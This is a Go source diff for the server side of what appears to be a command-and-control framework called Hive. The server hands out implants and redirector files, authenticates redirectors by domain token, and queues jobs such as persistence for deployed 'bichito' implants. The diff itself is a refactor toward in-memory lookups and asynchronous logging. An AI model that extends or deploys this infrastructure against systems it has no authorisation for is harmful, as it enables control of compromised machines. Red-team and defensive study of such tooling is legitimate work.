@@ -14,9 +14,9 @@ import (
     "bytes"
     //Debug
     //"net/http/httputil"
-    "strings"
+    //"strings"
     "sync"
-    "strconv"
+    //"strconv"
     "io/ioutil"
     "encoding/base64"
 )
@@ -194,7 +194,7 @@ func GetVpsKey(w http.ResponseWriter, r *http.Request) {
     if !ok || len(keys[0]) < 1 {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad GetVpsKey Get Query from:"+cid)
+        go addLogDB("Hive",time,"Bad GetVpsKey Get Query from:"+cid)
         return
     }
 
@@ -203,7 +203,7 @@ func GetVpsKey(w http.ResponseWriter, r *http.Request) {
     if err != nil {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad GetVpsKey Get Query from:"+cid)
+        go addLogDB("Hive",time,"Bad GetVpsKey Get Query from:"+cid)
         return
     }
     
@@ -225,7 +225,7 @@ func GetImplant(w http.ResponseWriter, r *http.Request) {
     if !ok || len(implantname[0]) < 1 {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad implantname Get Implant Query from:"+cid)
+        go addLogDB("Hive",time,"Bad implantname Get Implant Query from:"+cid)
         return
     }
 
@@ -233,7 +233,7 @@ func GetImplant(w http.ResponseWriter, r *http.Request) {
     if !ok || len(implantname[0]) < 1 {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad osName Get Implant Query from:"+cid)
+        go addLogDB("Hive",time,"Bad osName Get Implant Query from:"+cid)
         return
     }
 
@@ -241,7 +241,7 @@ func GetImplant(w http.ResponseWriter, r *http.Request) {
     if !ok || len(arch[0]) < 1 {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad arch Get Implant Query from:"+cid)
+        go addLogDB("Hive",time,"Bad arch Get Implant Query from:"+cid)
         return
     }
 
@@ -251,7 +251,7 @@ func GetImplant(w http.ResponseWriter, r *http.Request) {
     if err != nil {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Error reading Implant File:"+cid)
+        go addLogDB("Hive",time,"Error reading Implant File:"+cid)
         return
     }
 
@@ -277,7 +277,7 @@ func GetRedirector(w http.ResponseWriter, r *http.Request) {
     if !ok || len(implantname[0]) < 1 {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Bad implantname Get Redirector Query from:"+cid)
+        go addLogDB("Hive",time,"Bad implantname Get Redirector Query from:"+cid)
         return
     }
 
@@ -285,7 +285,7 @@ func GetRedirector(w http.ResponseWriter, r *http.Request) {
     if err != nil {
         //ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
-        addLogDB("Hive",time,"Error reading Redirector File:"+cid)
+        go addLogDB("Hive",time,"Error reading Redirector File:"+cid)
         return
     }
 
@@ -370,7 +370,7 @@ func PostUser(w http.ResponseWriter, r *http.Request) {
     if (cid == "Bad") || (cid == ""){ 
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := "User Auth(No Cid returned)"
-        addLogDB("Hive",time,elog)          
+        go addLogDB("Hive",time,elog)          
         return
     }
 
@@ -393,21 +393,9 @@ func PostUser(w http.ResponseWriter, r *http.Request) {
 		return
     }
 
-
-
     job.Cid = cid
-    //If it targets a bichito;Set RID to target Job, in function of the last RID assigned to the Bot
-    if !strings.Contains(job.Pid,"Hive"){
-        job.Pid,err = getRidbyBid(job.Chid)
-        if err != nil {
-            //ErrorLog
-            time := time.Now().Format("02/01/2006 15:04:05 MST")
-            elog := fmt.Sprintf("%s%s","Jobs(Error Getting Rid by Chid):",err.Error())
-            go addLogDB("Hive",time,elog)
-            return
-        } 
-    }
-	
+
+
 
     //Check that the size of the Result doesn't exceed 20 MB
     bytesParameters := len(job.Parameters)
@@ -424,7 +412,8 @@ func PostUser(w http.ResponseWriter, r *http.Request) {
     }
 
 
-    go userAddJob(job)
+
+    go jobProcessor(job,false)
 
     //Debug
     /*
@@ -435,8 +424,10 @@ func PostUser(w http.ResponseWriter, r *http.Request) {
     fmt.Println(string(requestDump))
     */
 
+    return
 }
 
+/*
 func userAddJob(job *Job){
 
     //Don't add Parameters in the Job Log to avoid unnecessary secrets logging
@@ -469,10 +460,10 @@ func userAddJob(job *Job){
         go bichitoStatus(job)
     }
 
-    jobProcessor(job)
+    jobProcessor(job,false)
 
 }
-
+*/
 
 // Check Authorization header for a JSON encoded object:
 // Authorization: JSON{username,password}
@@ -487,7 +478,7 @@ func userAuth(authbearer string) string{
     if errD != nil{
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := fmt.Sprintf("%s%s","User Auth(Bad Encoding):",errD.Error())
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return "Bad"
     }
 
@@ -496,17 +487,17 @@ func userAuth(authbearer string) string{
     if !((len(userauth.Username) > 0 ) && (len(userauth.Password) > 0)){
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := fmt.Sprintf("%s","User Auth(Bad Formatted Username/Password)")
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return "Bad"      
     }
     
 
     //Check DB username/hash,generate token, and on memory user data
-    cid,err := getCidbyAuthDB(userauth.Username,userauth.Password)
+    cid,err := getCidbyAuthDBMem(userauth.Username,userauth.Password)
     if err != nil{
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := fmt.Sprintf("%s%s","User Auth(Bad Username/pwd):",err.Error())
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return "Bad"
     }
     return cid
@@ -524,7 +515,7 @@ func GetRed(w http.ResponseWriter, r *http.Request) {
         return
     }   
 
-    rid,_ := getRedRidbyDomain(domain)
+    _,rid := getRedRidbyDomainMem(domain)
 
     //Debug
     /*
@@ -625,14 +616,16 @@ func PostRed(w http.ResponseWriter, r *http.Request) {
     	//ErrorLog
         time := time.Now().Format("02/01/2006 15:04:05 MST")
 		elog := fmt.Sprintf("%s%s","Jobs(Error Decoding Redirector Job):",err.Error())
-		addLogDB("Hive",time,elog)
+		go addLogDB("Hive",time,elog)
 		return
     }
 
-    go redAddJob(job)
+    go jobProcessor(job,false)
     return
 }
 
+
+/*
 func redAddJob(job *Job){
 
 
@@ -640,18 +633,18 @@ func redAddJob(job *Job){
     
     //TO be deprecated
     if job.Job == "BiChecking"{     
-        go jobProcessor(job)
+        go jobProcessor(job,false)
         return
     }
 
     if job.Job == "log"{    
-        go jobProcessor(job)
+        go jobProcessor(job,false)
         return
     }
 
     //Main Implant beacon status
     if job.Job == "BiPing"{     
-        go jobProcessor(job)
+        go jobProcessor(job,false)
         return
     }
 
@@ -687,7 +680,7 @@ func redAddJob(job *Job){
     //Persistence Flows
     if (job.Job == "persistence") && (job.Status == "Processing") {  
    
-        go jobProcessor(job)
+        go jobProcessor(job,false)
         return
     } 
 
@@ -747,6 +740,8 @@ func redAddJob(job *Job){
     go updateMemoryDB("jobs")
     return
 }
+*/
+
 
 func CheckingRed(w http.ResponseWriter, r *http.Request) {
     
@@ -759,30 +754,30 @@ func CheckingRed(w http.ResponseWriter, r *http.Request) {
     var rid string
     var err error
     if domainsInputWhite(domain){
-        rid,err = getRedRidbyDomain(domain)
+        err,rid = getRedRidbyDomainMem(domain)
         if err != nil {
             //ErrorLog
             time := time.Now().Format("02/01/2006 15:04:05 MST")
             elog := fmt.Sprintf("%s%s","Error Getting Rid of domain:"+domain,err.Error())
-            addLogDB("Hive",time,elog)
+            go addLogDB("Hive",time,elog)
             return
         }
 
     //For Offline Implants
     }else if namesInputWhite(domain){
         
-        rid,err = getRedRidbyImplantName(domain)
+        rid,err = getRedRidbyImplantNameMem(domain)
         if err != nil {
             //ErrorLog
             time := time.Now().Format("02/01/2006 15:04:05 MST")
             elog := fmt.Sprintf("%s%s","Error Getting Rid of Offline Implant:"+domain,err.Error())
-            addLogDB("Hive",time,elog)
+            go addLogDB("Hive",time,elog)
             return
         }
     }else{
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := "Red Checking Error(Bad Formatted Domain or Implant Name)"
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return    
     }
 
@@ -805,36 +800,39 @@ func redAuth(authbearer string) string{
     if errD != nil{
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := fmt.Sprintf("%s%s","Red Auth(Bad Encoding/Missing Header):",errD.Error())
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return "Bad"
     }
 
     var token string
     var err error
     if domainsInputWhite(redauth.Domain){
-        err,token = getDomainTokenDB(redauth.Domain)
+        err,token = getDomainTokenDBMem(redauth.Domain)
         if err != nil{
             time := time.Now().Format("02/01/2006 15:04:05 MST")
             elog := "Red Auth(Not token found for target "+redauth.Domain+"):" + err.Error()
             //fmt.Println("Happening Domain:"+redauth.Domain+"time:"+time+"error:"+err.Error())
-            addLogDB("Hive",time,elog)
+            go addLogDB("Hive",time,elog)
             return "Bad"
         }
 
     //For Offline Implants
     }else if namesInputWhite(redauth.Domain){
-        err,token = getImplantTokenDB(redauth.Domain)
+        err,token = getImplantTokenDBMem(redauth.Domain)
         if err != nil{
-            time := time.Now().Format("02/01/2006 15:04:05 MST")
-            elog := "Red Auth(Not token found for target Offline Implant:"+redauth.Domain+"):" + err.Error()
-            //fmt.Println("Happening Domain:"+redauth.Domain+"time:"+time+"error:"+err.Error())
-            addLogDB("Hive",time,elog)
-            return "Bad"
+            err,token = getImplantTokenDB(redauth.Domain)
+            if err != nil{
+                time := time.Now().Format("02/01/2006 15:04:05 MST")
+                elog := "Red Auth(Not token found for target Offline Implant:"+redauth.Domain+"):" + err.Error()
+                //fmt.Println("Happening Domain:"+redauth.Domain+"time:"+time+"error:"+err.Error())
+                go addLogDB("Hive",time,elog)
+                return "Bad"
+            }
         }
     }else{
         time := time.Now().Format("02/01/2006 15:04:05 MST")
         elog := "Red Auth(Bad Formatted Domain or Implant Name)"
-        addLogDB("Hive",time,elog)     
+        go addLogDB("Hive",time,elog)     
         return "Bad"    
     }
 
@@ -847,7 +845,7 @@ func redAuth(authbearer string) string{
 
     time := time.Now().Format("02/01/2006 15:04:05 MST")
     elog := fmt.Sprintf("%s%s","Red Auth(Bad token):",err.Error())
-    addLogDB("Hive",time,elog)
+    go addLogDB("Hive",time,elog)
     return "Bad"
 
 }
